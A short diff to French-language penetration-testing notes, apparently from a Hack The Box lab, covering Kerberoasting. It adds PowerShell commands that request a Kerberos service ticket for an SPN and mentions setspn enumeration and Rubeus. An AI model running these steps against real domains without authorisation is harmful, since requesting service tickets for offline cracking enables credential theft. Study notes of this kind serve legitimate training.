@@ -21,8 +21,11 @@ setspn.exe -q */*
 ```
 
 ```powershell
-# Demander un TGS pour le 
+# Demander un TGS pour le SPN désiré (compte utilisateur)
+Add-Type -AssemblyName System.IdentityModel
+PS C:\htb> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "SAPService/srvtest.domain.local"
 ```
+
 #### Utiliser Rubeus.exe
 
 Il réalise les opérations suivantes :
